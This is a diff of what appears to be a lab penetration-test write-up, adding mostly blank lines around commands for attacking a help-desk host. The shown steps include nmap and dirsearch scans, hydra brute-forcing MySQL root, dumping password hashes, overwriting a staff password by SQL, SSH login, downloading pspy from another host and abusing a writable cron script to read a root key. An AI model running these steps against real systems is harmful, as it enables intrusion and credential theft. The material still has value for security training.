@@ -45,6 +45,7 @@ sudo nmap -Pn -n $ip -sC -sV -p- --open -oN nmap/nmap.log
 Reminder:
 1. Check all the version
 2. Check all the open ports
+
 ![RESULTS](ss/1.png)
 
 Results: Discovered ftp, ssh, http and mysql services open
@@ -81,10 +82,12 @@ put test.txt
 - `pub` directory discovered
 - Upload permission denied
 - No useful files available
+
 ## Web Enumeration
 
 The web application was accessed through the browser.
 Navigate to `http://10.11.1.11`.
+
 ![RESULTS](ss/4.png)
 
 Results: A **desktop support center application** was displayed.
@@ -100,6 +103,7 @@ dirsearch -u $ip
 ```
 
 ![Results](ss/5.png)
+
 ![RESULTS](ss/6.png)
 
 Results: Discovered couple interesting directory.
@@ -113,9 +117,11 @@ Interested Directory Listing:
 ```
 
 /account.php: an account registration webpage
+
 ![RESULTS](ss/7.png)
 
 /web.config:
+
 ![RESULTS](ss/8.png)
 
 For the login page, there's two different login page:
@@ -131,14 +137,17 @@ For the login page, there's two different login page:
 ## Exploitation
    
 In /account.php: create an account and see it works
+
 ![RESULTS](ss/11.png)
 
 Results: Not working, needed email verification.
+
 ## MYSQL Enumeration
 
 ```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://$ip -c 1
 ```
+
 ![RESULTS](ss/12.png)
 
 Results: Discovered password and username
@@ -146,6 +155,7 @@ Results: Discovered password and username
 ```mysql
 SELECT user_id, username, passwd FROM ost_user_account;
 ```
+
 ![RESULTS](ss/13.png)
 
 Results: Discovered a hash for user id 2. But not showing what users.
@@ -155,6 +165,7 @@ While continue enumerating the table, found `ost_staff`
 ```mysql
 SELECT staff_id, username, passwd FROM ost_staff;
 ```
+
 ![RESULTS](ss/14.png)
 
 Found user id 2 is helpdesk
@@ -166,6 +177,7 @@ echo '$2a$08$WLIxqtBatS/omAFsAg2e.uOUckvy44GB/ONx2qpQv3pZx5QmDOrNi' > creds.txt
 
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt creds.txt 
 ```
+
 ![RESULTS](ss/15.png)
 
 Results: After prolonged execution, the password was not cracked.
@@ -177,17 +189,20 @@ Update ost_staff
 SET PASSWD = MD5("IamHacker123")
 WHERE staff_id = 1;
 ```
+
 ![RESULTS](ss/16.png)
 
 Results: Successfully changed the password
 
 Navigate to `http://10.11.1.11/scp/login.php`
 login with account: helpdesk::IamHacker123
+
 ![RESULTS](ss/17.png)
 
 Results: Successfully login. 
 
 Enumerating the website, to get more information
+
 ![RESULTS](ss/18.png)
 
 Results: Found another password and username for admin panel.
@@ -200,9 +215,11 @@ SSH to try all the password and username i found
 ssh helpdesk@10.11.1.11
 helpdesk90621
 ```
+
 ![RESULTS](ss/19.png)
 
 Success logged in through SSH.
+
 # Linux Privilege Escalation
 
 ```bash
@@ -225,6 +242,7 @@ wget http://172.16.1.1/pspy64 && chmod +x pspy64
 timeout 120s /tmp/pspy64
 "found hidden cronjob "
 ```
+
 ![RESULTS](ss/20.png)
 
 Check if i do have permission on writting the file or not
@@ -235,6 +253,7 @@ ls -l /etc/rc.d/init.d/help
 # read the file
 cat /etc/rc.d/init.d/help
 ```
+
 ![RESULTS](ss/21.png)
 
 Results: Output shows the user helpdesk does have **`rwx`** permission for this file
@@ -256,6 +275,7 @@ id
 date
 cat /root/key.txt
 ```
+
 ![RESULTS](ss/22.png)
 
 # Remediation / Mitigation
